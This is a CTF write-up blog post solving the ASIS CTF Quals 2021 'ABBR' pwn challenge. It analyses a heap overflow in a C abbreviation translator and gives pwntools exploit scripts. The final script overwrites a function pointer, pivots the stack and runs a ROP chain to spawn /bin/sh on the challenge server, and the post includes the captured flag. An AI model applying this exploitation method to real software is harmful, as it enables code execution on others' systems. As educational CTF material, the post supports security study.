---
author: ikerl
categories: ctf
date: 2021-10-24 18:00:00 +0200
layout: post
tags: [ikerl]
title: ASIS CTF Quals 2021 - ABBR [Pwn]
---

*NOTE: In this CTF we participated with [ripp3rs](https://ctftime.org/team/50984).*

## Introduction

```
Abbreviations in English are complicated... Why?
```

In this challenge we are given a 64-bit statically linked executable, compiled with all the usual memory protections except PIE. The program is a translator that replaces abbreviations with the full text following the established rules.

For example, these are some of the rules:

```
rop -> return oriented programming
jop -> jump oriented programming
cop -> call oriented programming
aar -> arbitrary address read
aaw -> arbitrary address write
www -> write what where
oob -> out of bounds
ret2 -> return to 
```

Therefore, the string `rop is god` would become `return oriented programming is god`.

## Source code analysis

In addition to the executable, the source code of the program is provided, therefore, its analysis is easier. The vulnerable function is `english_expand` because it allows the string to be expanded out of bounds.

```c
void english_expand(char *text) {
  int i, alen, blen;
  Rule *r;
  char *p, *q;
  char *end = &text[strlen(text)-1]; // pointer to the last character

  /* Replace all abbreviations */
  for (p = text; *p; ++p) {
    for (i = 0; i < sizeof(rules) / sizeof(Rule); i++) {
      r = &rules[i];
      alen = strlen(r->a);
      blen = strlen(r->b);
      if (strncasecmp(p, r->a, alen) == 0) {
        // i.e "i'm pwn noob." --> "i'm pwn XXnoob."
        for (q = end; q > p; --q)
          /* OVERFLOW! */
          *(q+blen-alen) = *q;
        // Update end
        end += blen-alen;
        *(end+1) = '\0';
        // i.e "i'm pwn XXnoob." --> "i'm pwn newbie."
        memcpy(p, r->b, blen);
      }
    }
  }
}
```

Using the abbreviations we can exploit the above function, get the text to overflow the limits of the text chunk and then start overwriting heap memory. The text chunk and the translator's chunk are allocated during the creation of the translator. The following function is the one that performs the memory allocation in the heap:

```c
Translator *translator_new(int size) {
  Translator *t;

  /* Allocate region for text */
  char *text = (char*)calloc(sizeof(char), size);
  if (text == NULL)
    return NULL;

  /* Initialize translator */
  t = (Translator*)malloc(sizeof(Translator));
  t->text = text;
  t->size = size;
  t->translate = english_expand;

  return t;
}
```

First the memory chunk of the text is allocated and then the memory used by the translator structure. The `translate` field points to the `english_expand` function, so we can exploit the overflow of `text` to overwrite this function with an arbitrary address. When the `translate` function is called, the function we have just modified will be executed.

We can use the following exploit to change the original execution flow to `0x42424242424242` and obtain a segfault:

```python
from pwn import *

io = gdb.debug("./abbr")

io.recvuntil("text: ")

text = b"rop "
io.sendline( text + (0x1000-len(text)-8)*b"A" + b"\x42\x42\x42\x42\x42\x42\x42"
            
io.interactive()
```

When the `rop` abbreviation is replaced by the full text, the text will overflow the assigned chunk and will overwrite the translator's `translate` function.

## Exploitation

Now we have control of the execution flow but we can only use one gadget, since we can only overflow one function pointer. With a single gadget it is not possible to get code execution in this program. Therefore, we have to find a gadget that allows us to perform a stack pivot and, in this way, point `rsp` to our buffer and be able to ROP with the data we control.

Ideally, we would be able to use a gadget of the type:

```
mov rsp, rax
ret
```

However, the best we could find was the following (address `0x403446`):

```
mov esp, eax
jmp 0x40333a
```

`rax` points to our input, and it is moved to `rsp`. Fortunately, the `jmp 0x40333a` instruction returns without generating any segfault. However, jumping to that address has some side-effects, as it `pop`s from the stack three times; this will prove useful later.

Now, the problem is simplified to the usual rop challenge. We prepare the `execve` syscall with the necessary registers and we gain command execution when the syscall is called.

In order to jump to the `syscall` instruction, we use a gadget that has the instruction `call r12`. Fortunately, when we jumped to `0x40333a`, a user-controlled value was popped from the stack into `r12`.

This is the complete exploit code:

```python
from pwn import *

io = remote("168.119.108.148",10010)

io.recvuntil("text: ")

text = b"rop "

"""
# stack pivoting
0x0000000000403446 : mov esp, eax ; jmp 0x40333a   

# prepare execve syscall
0x000000000045a8f7 : pop rax ; ret    # rax -> execve
0x0000000000404cfe : pop rsi ; ret    # rsi -> 0x0
0x00000000004017df : pop rdx ; ret    # rdx -> 0x0
0x00000000004012e3 : syscall          # r12 -> syscall

# rdi -> /bin/sh
0x0000000000401d61 : pop rbp ; ret
0x000000000049b96f : add rdi, rbp ; call r12  # call syscall
"""

stack_pivoting = p64(0x403446)
syscall = p64(0x4012e3)
pop_rax = p64(0x45a8f7)
pop_rsi = p64(0x404cfe)
pop_rbp = p64(0x401d61)
pop_rdx = p64(0x4017df)
call_syscall = p64(0x49b96f)

io.sendline( text + (0x1000-len(text)-8)*b"A" + stack_pivoting + b"/bin/sh\x00" + b"C"*7 + syscall + pop_rax + p64(59) + pop_rsi + p64(0) + pop_rbp + p64(1) + pop_rdx + p64(0) + call_syscall )

io.interactive()

# ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
```
